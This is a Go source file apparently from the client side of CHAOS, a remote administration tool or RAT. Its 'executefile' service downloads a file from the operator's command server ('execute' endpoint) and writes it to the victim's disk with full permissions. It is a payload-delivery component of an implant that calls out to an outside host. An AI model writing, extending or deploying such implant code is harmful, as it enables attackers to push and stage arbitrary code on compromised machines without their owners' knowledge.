package executefile


import (
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/gateways"

	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
)

type Service struct {
	Configuration *environment.Configuration
	Gateway       gateways.Gateway
}

func NewService(configuration *environment.Configuration, gateway gateways.Gateway) *Service {
	return &Service{
		Configuration: configuration,
		Gateway:       gateway,
	}
}

func (s *Service) RunFile(filepath string) error {
	filename := getFilenameFromPath(filepath)
	url := fmt.Sprintf("%s/%s", fmt.Sprint(s.Configuration.Server.Url, "execute"), filename)

	res, err := s.Gateway.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("request failed with status code: %d", res.StatusCode)
	}

	if err := ioutil.WriteFile(filepath, res.ResponseBody, os.ModePerm); err != nil {
		return err
	}
	return nil
}

func getFilenameFromPath(path string) string {
	return filepath.Base(path)
}
